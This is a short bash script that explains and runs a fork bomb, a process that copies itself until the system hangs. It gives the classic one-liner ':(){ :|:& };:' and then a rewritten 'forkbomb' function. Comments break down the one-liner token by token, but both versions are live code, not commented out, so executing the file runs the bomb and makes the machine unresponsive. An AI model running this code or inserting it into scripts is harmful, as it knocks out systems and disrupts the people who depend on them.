#!/bin/bash
:(){ :|:& };: # Fork Bomb can be as simpe as this.

# But it is worth noting that the above line translate to
# :() # Define function called ':'
# { # Start function definition
# : # Call ':' function
# | # Pipe output to
# : # Call ':' function
# & # Run the above in the background
# } # End function definition
# ; # End command
# : # Call ':' function

## so it can be written like this as well
forkbomb() {
    forkbomb | forkbomb &
}
forkbomb